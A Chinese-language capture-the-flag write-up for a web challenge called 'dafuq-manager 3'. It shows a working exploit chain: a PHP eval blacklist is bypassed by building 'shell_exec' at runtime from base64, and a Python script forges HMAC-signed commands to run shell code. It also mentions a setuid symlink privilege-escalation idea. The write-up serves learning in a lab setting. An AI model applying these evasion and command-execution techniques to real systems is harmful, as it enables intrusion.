# PHM #33 Web — dafuq-manager 3

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 200 |

## 題目

> Get a shell to find flag 3

## 分析

Flag3 在 `/var/www/webhdisk/flag3/` 目錄下, 有 `meow`, `meow.c`, `Makefile`, `flag3`:

- `meow.c`: 把 `argv[0]` 的 stat uid/gid 當 setuid 目標, 然後 `open(argv[1], O_RDONLY)` 印出內容
- `Makefile`: `chown flag3:flag3 meow` + `chmod +s meow` (setuid), `chmod 400 flag3` (只有 flag3 owner 可讀)
- 預期執行: `./meow flag3` → setuid 到 flag3 → 讀 flag3

→ 要在 shell 裡執行 `./meow flag3`.

從 [#32](dafuq-manager-2.md) 的 `eval` 已能跑任意 PHP code, 但 blacklist 擋了 `system`, `exec`, `popen`, `pcntl_exec`, `proc_open`, `passthru`, 反引號, `eval`, `assert`, `preg_replace`, `create_function`, `include`, `require`, `curl`.

### Blacklist bypass

Blacklist 用 `stristr($cmd, $bad)` 檢查 **source 字串**. source 裡只要不出現 `exec` / `system` 這類字串就過. **執行期間**用 `$f = base64_decode("c2hlbGxfZXhlYw==")` 得到 `"shell_exec"`, 再 `$f("cmd")` 就繞過.

(`shell_exec` 原本在 blacklist 的 wildcard 範圍 — `stristr` 會 match `exec` 子字串. 但 base64 字串 `c2hlbGxfZXhlYw==` 不含 `exec`.)

## 解法

```python
import base64, hmac, hashlib, urllib.parse
secret = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3'

cmd = '$f=base64_decode("c2hlbGxfZXhlYw==");echo $f("cd /var/www/webhdisk/flag3 && ./meow flag3");'

cmd_b64 = base64.b64encode(cmd.encode()).decode()
h = hmac.new(secret.encode(), cmd.encode(), hashlib.sha256).hexdigest()
command = urllib.parse.quote(f'{cmd_b64}.{h}')

# curl '.../index.php?action=debug&dir[]=magically&command=' + command
```

Output: `FLAG{...}`

## Flag

```
FLAG{Oh, Looks like you have a shell. Please don't fuck up the system.}
```

## 感想

兩層 bypass:
1. 從 #32 繼承的 `strcmp` + secret_key 洩漏 → eval
2. Blacklist 用 substring match, base64 一下就過

Setuid binary 的 `argv[0]` + `stat()` 設計是常見 priv-esc 範例 — 若 attacker 把 `meow` symlink 到別人擁有的檔案, `stat(argv[0])` 回報的 uid 可被操縱. 本題不用利用這個, 直接正常執行 `./meow flag3` 就夠了 (meow 是 flag3 owner + setuid).
